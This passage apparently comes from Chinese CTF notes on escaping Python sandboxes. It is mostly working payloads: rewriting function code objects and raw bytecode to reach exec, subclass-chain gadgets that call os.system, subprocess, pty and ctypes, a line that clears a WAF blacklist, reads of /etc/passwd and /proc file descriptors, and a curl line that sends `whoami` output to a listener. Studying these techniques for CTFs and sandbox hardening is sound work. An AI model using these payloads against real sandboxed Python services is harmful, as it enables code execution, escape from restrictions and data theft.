<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bytecode = get_flag.__code__</span><br><span class="line">&gt;&gt;&gt; dis.disassemble(bytecode)</span><br><span class="line">  1           0 RESUME                   0</span><br><span class="line"></span><br><span class="line">  2           2 LOAD_CONST               1 (1)</span><br><span class="line">              4 STORE_FAST               1 (var1)</span><br><span class="line"></span><br><span class="line">  3           6 LOAD_CONST               2 (&#x27;secretcode&#x27;)</span><br><span class="line">              8 STORE_FAST               2 (var2)</span><br><span class="line"></span><br><span class="line">  4          10 LOAD_CONST               3 (&#x27;some&#x27;)</span><br><span class="line">             12 LOAD_CONST               4 (&#x27;array&#x27;)</span><br><span class="line">             14 BUILD_LIST               2</span><br><span class="line">             16 STORE_FAST               3 (var3)</span><br><span class="line"></span><br><span class="line">  5          18 LOAD_FAST                0 (some_input)</span><br><span class="line">             20 LOAD_FAST                2 (var2)</span><br><span class="line">             22 COMPARE_OP               2 (==)</span><br><span class="line">             28 POP_JUMP_FORWARD_IF_FALSE     2 (to 34)</span><br><span class="line"></span><br><span class="line">  6          30 LOAD_CONST               5 (&#x27;THIS-IS-THE-FALG!&#x27;)</span><br><span class="line">             32 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">  8     &gt;&gt;   34 LOAD_CONST               6 (&#x27;Nope&#x27;)</span><br><span class="line">             36 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<h3 id="修改函数信息"><a href="#修改函数信息" class="headerlink" title="修改函数信息"></a>修改函数信息</h3><p>使用types.CodeType进行修改</p>
<p>修改常量<br>先打印函数常量格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oCode = src.__code__.co_consts</span><br><span class="line">print(oCode)</span><br></pre></td></tr></table></figure>

<p>然后修改常量控制函数参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">src.__code__= types.CodeType(oCode.co_argcount, </span><br><span class="line">oCode.co_posonlyargcount, </span><br><span class="line">oCode.co_kwonlyargcount, </span><br><span class="line">oCode.co_nlocals, </span><br><span class="line">oCode.co_stacksize, </span><br><span class="line">oCode.co_flags,</span><br><span class="line">oCode.co_code, </span><br><span class="line">(None, &#x27;/flag&#x27;, &#x27;r&#x27;, &#x27;utf-8&#x27;, (&#x27;encoding&#x27;,))</span><br><span class="line">oCode.co_names, </span><br><span class="line">oCode.co_varnames,</span><br><span class="line">oCode.co_filename,</span><br><span class="line">oCode.co_name, </span><br><span class="line">oCode.co_firstlineno, </span><br><span class="line">oCode.co_lnotab,</span><br><span class="line">oCode.co_freevars,</span><br><span class="line">oCode.co_cellvars,)</span><br></pre></td></tr></table></figure>

<p>修改函数字节码<br>执行输入的hex</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from types import CodeType</span><br><span class="line">def x():pass</span><br><span class="line">x.__code__ = CodeType(0,0,0,0,0,0,bytes.fromhex(input(&quot;&gt;&gt;&gt; &quot;)[:176]),(),(),(),&#x27;Δ&#x27;,&#x27;♦&#x27;,&#x27;✉︎&#x27;,0,bytes(),bytes(),(),())</span><br><span class="line">a = x()</span><br></pre></td></tr></table></figure>

<p>payload1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import dis</span><br><span class="line"></span><br><span class="line">def assemble(ops):</span><br><span class="line">    cache = bytes([dis.opmap[&quot;CACHE&quot;], 0])</span><br><span class="line">    ret = b&quot;&quot;</span><br><span class="line">    for op, arg in ops:</span><br><span class="line">        opc = dis.opmap[op]</span><br><span class="line">        ret += bytes([opc, arg])</span><br><span class="line">        ret += cache * dis._inline_cache_entries[opc]</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">co_code = assemble(</span><br><span class="line">    [</span><br><span class="line">        (&quot;RESUME&quot;, 0),</span><br><span class="line">        (&quot;LOAD_CONST&quot;, 115),</span><br><span class="line">        (&quot;UNPACK_EX&quot;, 29),</span><br><span class="line">        (&quot;BUILD_TUPLE&quot;, 28),</span><br><span class="line">        (&quot;POP_TOP&quot;, 0),</span><br><span class="line">        (&quot;SWAP&quot;, 2),</span><br><span class="line">        (&quot;POP_TOP&quot;, 0),</span><br><span class="line">        (&quot;LOAD_CONST&quot;, 115),</span><br><span class="line">        (&quot;SWAP&quot;, 2),</span><br><span class="line">        (&quot;BINARY_SUBSCR&quot;, 0),</span><br><span class="line">        (&quot;COPY&quot;, 1),</span><br><span class="line">        (&quot;CALL&quot;, 0),    # input</span><br><span class="line"></span><br><span class="line">        (&quot;LOAD_CONST&quot;, 115),</span><br><span class="line">        (&quot;UNPACK_EX&quot;, 21),</span><br><span class="line">        (&quot;BUILD_TUPLE&quot;, 20),</span><br><span class="line">        (&quot;POP_TOP&quot;, 0),</span><br><span class="line">        (&quot;SWAP&quot;, 2),</span><br><span class="line">        (&quot;POP_TOP&quot;, 0),</span><br><span class="line">        (&quot;LOAD_CONST&quot;, 115),</span><br><span class="line">        (&quot;SWAP&quot;, 2),</span><br><span class="line">        (&quot;BINARY_SUBSCR&quot;, 0),</span><br><span class="line">        (&quot;SWAP&quot;, 2),</span><br><span class="line">        (&quot;CALL&quot;, 0),    # exec</span><br><span class="line"></span><br><span class="line">        (&quot;RETURN_VALUE&quot;, 0),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">print(co_code.hex())</span><br></pre></td></tr></table></figure>

<p>payload2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from opcode import opmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">co_code = bytes([</span><br><span class="line">                 opmap[&quot;KW_NAMES&quot;], 0,</span><br><span class="line">                 opmap[&quot;RESUME&quot;], 0,</span><br><span class="line">                 opmap[&quot;PUSH_NULL&quot;], 0,</span><br><span class="line">                 opmap[&quot;LOAD_FAST&quot;], 82, # exec</span><br><span class="line">                 opmap[&quot;LOAD_FAST&quot;], 6, # my input</span><br><span class="line">                 opmap[&quot;PRECALL&quot;], 1,</span><br><span class="line">                 opmap[&quot;CACHE&quot;],</span><br><span class="line">                 opmap[&quot;CACHE&quot;],</span><br><span class="line">                 opmap[&quot;CALL&quot;], 1,</span><br><span class="line">                 opmap[&quot;CACHE&quot;],</span><br><span class="line">                 opmap[&quot;CACHE&quot;],</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = co_code.ljust(176, b&quot;B&quot;) # add padding util the input limit is reached</span><br><span class="line">print(payload.hex().encode() + b&quot; if __import__(&#x27;os&#x27;).system(&#x27;cat /*&#x27;) else 0&quot;)</span><br></pre></td></tr></table></figure>

<p>LOAD_FAST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(lambda:0).__class__((lambda:0).__code__.replace(co_code=b&#x27;|\x17S\x00&#x27;, co_argcount=0, co_nlocals=0, co_varnames=(</span><br><span class="line">)), &#123;&#125;)()[&quot;exec&quot;](&quot;import os;os.system(&#x27;ls&#x27;)&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h3><p>获取 python 版本<br>sys 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.version</span><br></pre></td></tr></table></figure>

<p>platform模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure>

<p>获取 linux 版本<br>platform 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure>

<p>获取路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure>

<h3 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h3><p>globals 函数<br>globals 函数可以获取所有的全局变量。下面是一个例题，题目的目标就是获取 fake_key_var_in_the_local_but_real_in_the_remote 的值进入 backdoor 函数。这里使用 globals 就可以获取 fake_key_var_in_the_local_but_real_in_the_remote 的值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#it seems have a backdoor</span><br><span class="line">#can u find the key of it and use the backdoor</span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    code = input(&quot;&gt;&quot;)</span><br><span class="line">    if(len(code)&gt;9):</span><br><span class="line">        return print(&quot;you&#x27;re hacker!&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(code))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">    print(&quot;Please enter the admin key&quot;)</span><br><span class="line">    key = input(&quot;&gt;&quot;)</span><br><span class="line">    if(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = input(&quot;&gt;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(code))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Nooo!!!!&quot;)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _       _          _       _          _       _        </span><br><span class="line"> | |     | |        | |     | |        | |     | |       </span><br><span class="line"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span><br><span class="line"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span><br><span class="line"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span><br><span class="line"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Now the program has two functions&quot;)</span><br><span class="line">print(&quot;can you use dockerdoor&quot;)</span><br><span class="line">print(&quot;1.func&quot;)</span><br><span class="line">print(&quot;2.backdoor&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if(input_data == &quot;1&quot;):</span><br><span class="line">    func()</span><br><span class="line">    exit(0)</span><br><span class="line">elif(input_data == &quot;2&quot;):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(0)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;not found the choice&quot;)</span><br><span class="line">    exit(0)</span><br></pre></td></tr></table></figure>

<p>help函数<br>help 函数也可以获取某个模块的帮助信息，包括全局变量, 输入 <strong>main</strong> 之后可以获取当前模块的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help&gt; __main__</span><br></pre></td></tr></table></figure>
<p>相比 globals() 而言 help() 更短，在一些限制长度的题目中有利用过这个点。</p>
<p>vars 函数<br>vars() 函数返回该对象的命名空间（namespace）中的所有属性以字典的形式表示。当前模块的所有变量也会包含在里面，一些过滤链 globals 和 help 函数的场景可以尝试使用 vars()</p>
<h3 id="获取模块内部函数或变量"><a href="#获取模块内部函数或变量" class="headerlink" title="获取模块内部函数或变量"></a>获取模块内部函数或变量</h3><h4 id="获取指定模块内部变量"><a href="#获取指定模块内部变量" class="headerlink" title="获取指定模块内部变量"></a>获取指定模块内部变量</h4><p>获取模块内部函数或变量的目的主要是为了信息泄露或篡改。比如 waf.py 中存在某个变量定义了危险字符列表，我们可以考虑先获取这个变量然后将其清空。</p>
<p>可以先获取 load_module，然后通过 load_module 导入特定的模块，进而篡改其中变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(().__class__.__bases__.__iter__().__next__().__subclasses__().__getitem__(84).load_module(&quot;waf&quot;).__dict__.values()).__getitem__(8).clear()</span><br></pre></td></tr></table></figure>

<h4 id="获取-main-中变量"><a href="#获取-main-中变量" class="headerlink" title="获取 __main__ 中变量"></a>获取 __main__ 中变量</h4><p>例如获取 __main__</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]</span><br></pre></td></tr></table></figure>

<h4 id="获取命名空间中的变量-模块-函数等"><a href="#获取命名空间中的变量-模块-函数等" class="headerlink" title="获取命名空间中的变量&#x2F;模块&#x2F;函数等"></a>获取命名空间中的变量&#x2F;模块&#x2F;函数等</h4><p>__globals__是一个特殊属性，能够以 dict 的形式返回函数（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;request&#x27;]</span><br><span class="line">url_for.__globals__[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure>

<h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>打开文件后没有close</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/*/fd/*</span><br></pre></td></tr></table></figure>

<h2 id="删除模块"><a href="#删除模块" class="headerlink" title="删除模块"></a>删除模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&#x27;eval&#x27;]</span><br></pre></td></tr></table></figure>

<h3 id="reload"><a href="#reload" class="headerlink" title="reload"></a>reload</h3><p>reload 函数可以重新加载模块<br>在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]</span><br><span class="line">&lt;built-in function eval&gt;</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;]</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &#x27;eval&#x27;</span><br><span class="line">&gt;&gt;&gt; reload(__builtins__)</span><br><span class="line">&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]</span><br><span class="line">&lt;built-in function eval&gt;</span><br></pre></td></tr></table></figure>

<h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此只需要将 os 模块删除,然后再次导入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line"></span><br><span class="line">del sys.modules[&#x27;os&#x27;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="globals"><a href="#globals" class="headerlink" title="globals"></a>globals</h3><p>globals() 中存放了 builtins 模块的索引</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals()[&quot;__builtins__&quot;][&#x27;breakpoint&#x27;]</span><br></pre></td></tr></table></figure>

<h3 id="继承链"><a href="#继承链" class="headerlink" title="继承链"></a>继承链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[5]</span><br><span class="line">&lt;class &#x27;bytes&#x27;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># os</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line"># subprocess </span><br><span class="line">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line"># builtins</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]</span><br><span class="line"></span><br><span class="line"># help</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]</span><br><span class="line"></span><br><span class="line">#sys</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#commands (not very common)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#pty (not very common)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#importlib</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#imp</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">#pdb</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line"># ctypes</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())</span><br><span class="line"></span><br><span class="line"># multiprocessing</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="利用生成器栈帧逃逸"><a href="#利用生成器栈帧逃逸" class="headerlink" title="利用生成器栈帧逃逸"></a>利用生成器栈帧逃逸</h3><h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><p>生成器（Generator）是 Python 中一种特殊的迭代器，生成器可以使用 yield 关键字来定义。</p>
<p>yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
<h4 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def f():</span><br><span class="line">    a=1</span><br><span class="line">    while True:</span><br><span class="line">        yield a</span><br><span class="line">        a+=1</span><br><span class="line">f=f()</span><br><span class="line">print(next(f)) #1</span><br><span class="line">print(next(f)) #2</span><br><span class="line">print(next(f)) #3</span><br></pre></td></tr></table></figure>

<p>如果我们给a定义一个范围，a&lt;&#x3D;100 ，可以使用for语句一次性输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def f():</span><br><span class="line">    a=1</span><br><span class="line">    for i in range(100):</span><br><span class="line">        yield a</span><br><span class="line">        a+=1</span><br><span class="line">f=f()</span><br><span class="line">for value in f:</span><br><span class="line">    print(value)</span><br></pre></td></tr></table></figure>

<h4 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h4><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p>
<p>但是使用圆括号而不是方括号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=(i+1 for i in range(100))</span><br><span class="line">#next(a)</span><br><span class="line">for value in a:</span><br><span class="line">    print(value)</span><br></pre></td></tr></table></figure>

<h4 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h4><p>gi_code: 生成器对应的code对象。<br>gi_frame: 生成器对应的frame（栈帧）对象。<br>gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br>gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br>gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。</p>
